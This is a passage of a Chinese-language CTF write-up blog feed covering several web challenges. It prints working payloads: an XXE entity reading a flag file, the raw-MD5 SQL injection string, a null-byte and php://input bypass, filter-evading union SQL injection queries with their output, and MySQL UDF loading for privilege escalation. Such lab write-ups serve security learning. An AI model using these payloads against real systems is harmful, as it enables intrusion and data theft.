class="string">"evil-input"</span>).value;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">var</span> xhr = XHR();</span><br><span class="line"></span><br><span class="line">​        xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">​        xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line"></span><br><span class="line">​                data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line"></span><br><span class="line">​                tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line"></span><br><span class="line">​                tip_area.value = data.task.search+data.task.value;</span><br><span class="line"></span><br><span class="line">​            &#125;</span><br><span class="line"></span><br><span class="line">​        &#125;;</span><br><span class="line"></span><br><span class="line">​        xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line"></span><br><span class="line">​        xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br></pre></td></tr></table></figure><p>payload:</p><p>Content-Type: application/xml</p><p>​    <?xml version="1.0" encoding="utf-8"?></p><p>​    <!DOCTYPE data[</p><p>​    <!ENTITY file SYSTEM "file:////home/ctf/flag.txt"></p><p>]></p><p><data>&file;</data></p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>​    header 头里面发现 hint: "select * from <code>admin</code> where password='".md5($pass,true)."'"</p><p>​    md5 ( string $str [, bool $raw_output = FALSE ] ) : string</p><p>​    string 要计算的字符串 </p><p>​    raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六进制数</p><p>​    参考 <a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p><p>​        <a href="http://www.am0s.com/functions/204.html">http://www.am0s.com/functions/204.html</a></p><p>​    有个牛逼的字符串： ffifdyop</p><p>​    传入之后，最终的 sql 语句变为 select * from <code>admin</code> where password=''or'6�]��!r,��b'</p><p>​    成功闭合，得到万能密码</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>​    咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦</p><p>​    题目给了个 udf.so 的文件，IDA 启动，然而并没有发现啥东西（汇编还要加油</p><p>​    前几天刚看了MySQL提权就忘了，后来才知道 udf.so 也是拿来提权的，</p><p>​    <a href="http://vinc.top/2017/04/19/mysql-udf%E6%8F%90%E6%9D%83linux%E5%B9%B3%E5%8F%B0/">http://vinc.top/2017/04/19/mysql-udf%E6%8F%90%E6%9D%83linux%E5%B9%B3%E5%8F%B0/</a></p><p>​    </p><p>​    将 udf.so 导入到MySQL的插件里面，注意改下权限</p><p>​    mysql> show variables like "%plugin%";</p><p>​    +-------------------------------+------------------------+</p><p>​    | Variable_name                 | Value                  |</p><p>​    +-------------------------------+------------------------+</p><p>​    | default_authentication_plugin | mysql_native_password  |</p><p>​    | plugin_dir                    | /usr/lib/mysql/plugin/ |</p><p>​    +-------------------------------+------------------------+</p><p>​    2 rows in set (0.00 sec)</p><p>​    mysql> create function help_me returns string soname 'udf.so';</p><p>​    Query OK, 0 rows affected (0.00 sec)</p><p>​    mysql> select help_me();</p><p>​    +---------------------------------------------+</p><p>​    | help_me()                                   |</p><p>​    +---------------------------------------------+</p><p>​    | use getflag function to obtain your flag!!  |</p><p>​    +---------------------------------------------+</p><p>​    1 row in set (0.00 sec)</p><p>​    mysql> create function getflag returns string soname 'udf.so';</p><p>​    Query OK, 0 rows affected (0.00 sec)</p><p>​    mysql> select getflag();</p><p>​    +------------------------------------------+</p><p>​    | getflag()                                |</p><p>​    +------------------------------------------+</p><p>​    | PCTF{Interesting_U5er_d3fined_Function}  |</p><p>​    +------------------------------------------+</p><p>​    1 row in set (0.00 sec)</p><h2 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h2><p>​    然而又是 hash 扩展攻击，不做了</p><p>​    <?php </p><p>​    $auth = false;</p><p>​    $role = "guest";</p><p>​    $salt = '32342';</p><p>​    if (isset($_COOKIE["role"])) {</p><p>​        $role = unserialize($_COOKIE["role"]);</p><p>​        $hsh = $_COOKIE["hsh"];</p><p>​        if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {</p><p>​            $auth = true;</p><p>​        } else {</p><p>​            $auth = false;</p><p>​        }</p><p>​    } else {</p><p>​        $s = serialize($role);</p><p>​        setcookie('role',$s);</p><p>​        $hsh = md5($salt.strrev($s));</p><p>​        setcookie('hsh',$hsh);</p><p>​    }</p><p>​    if ($auth) {</p><p>​        echo "<h3>Welcome Admin. Your flag is ";</p><p>​    } else {</p><p>​        echo "<h3>Only Admin can see the flag!!</h3>";</p><p>​    }</p><p>​    ?> </p><h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>​    <?php</p><p>​        error_reporting(0);</p><p>​        echo "<!--index.phps-->";</p><p>​        if(!$_GET['id']) {</p><p>​            header('Location: index.php?id=1');</p><p>​            exit();</p><p>​        }</p><p>​        $id=$_GET['id'];</p><p>​        $a=$_GET['a'];</p><p>​        $b=$_GET['b'];</p><p>​        if(stripos($a,'.')) {</p><p>​            echo 'Hahahahahaha';</p><p>​            return ;</p><p>​        }</p><p>​        $data = @file_get_contents($a,'r');</p><p>​        if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 </p><p>​        and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4) {</p><p>​            require("flag.txt");</p><p>​        }</p><p>​        else {</p><p>​            print "work harder!harder!harder!";</p><p>​        }</p><p>​    ?></p><p>​    payload1: index.php/?id=a&a=php://input&b=%0034253</p><p>​    post: 1112 is a nice lab!</p><p>​    eregi() 会被 %00 截断，但 strlen() 不会</p><p>​    ==>  <!--index.phps-->�Come ON!!! {/^HT2mCpcvOLf}</p><p>​    进入该目录，自动跳转到 web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1</p><p>​    </p><p>​    发现空格被过滤，尝试绕过</p><p>​    - 使用注释绕过，/**/</p><p>​    - 使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用（）包围，并且两端可以没有多余的空格</p><p>​    - 使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a</p><p>​    这里可以用 /<em>233</em>/ 代替空格</p><p>​    </p><p>​    order by 没有回显，放弃该法</p><p>​    /?id=2/<em>233</em>/uunionnion/<em>233</em>/seselectlect/<em>233</em>/1,2,3%23</p><p>​    得到 3， 说明字段数也是 3</p><p>​    payload2: </p><p>​    获取所有数据库名</p><p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(schema_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.schemata%23</p><p>​    ==> information_schema,test</p><p>​    获取本数据库内的所有表名</p><p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(table_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.tables/<em>233</em>/where/<em>233</em>/table_schema=database()%23</p><p>​    ==> content</p><p>​    （以上两步可省略）</p><p>​    获取所有字段名</p><p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(column_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.columns/<em>233</em>/where/<em>233</em>/table_name=0x636f6e74656e74%23</p><p>​    ==> id,context,title</p><p>​    获取所有数据</p><p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(id,context,title)/<em>233</em>/frfromom/<em>233</em>/content%23</p><p>​    ==> 1PCTF{Fin4lly_U_got_i7_C0ngRatulation5}hi666</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>​    是一个输入框，输入密码，显示密码错误</p><p>​    扫不到其他目录，看看源码，有个 app.js </p><p>​    搜索 Wrong Password!!</p><p>​    $.post("checkpass.json", t,</p><p>​    function(t) {</p><p>​        self.checkpass(e) ? self.setState({</p><p>​            errmsg: "Success!!",</p><p>​            errcolor: b.green400</p><p>​        }) : (self.setState({</p><p>​            errmsg: "Wrong Password!!"</p><p>​            ......</p><p>​        }))</p><p>​    })</p><p>​    跟进去</p><p>​    function(e) {</p><p>​        if (25 !== e.length) return ! 1;</p><p>​        for (var t = [], n = 0; n < 25; n++) t.push(e.charCodeAt(n));</p><p>​        for (var r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259], o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]], n = 0; n < 25; n++) {</p><p>​            for (var i = 0, a = 0; a < 25; a++) i += t[a] * o[n][a];</p><p>​            if (i !== r[n]) return ! 1</p><p>​        }</p><p>​        return ! 0</p><p>​    }</p><p>​    变成了一个数学题，解线性方程组</p><p>​    import numpy as np</p><p>​    o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]]</p><p>​    r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259]</p><p>​    o = np.array(o)</p><p>​    r = np.array(r)</p><p>​    x = np.linalg.solve(o,r)</p><p>​    res = ''</p><p>​    for i in x:</p><p>​        res += chr(int(str(i)[0:-2]))</p><p>​    print(res)</p></script></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PORT-51&quot;&gt;&lt;a href=&quot;#PORT-51&quot; class=&quot;headerlink&quot; title=&quot;PORT 51&quot;&gt;&lt;/a&gt;PORT 51&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
</feed>
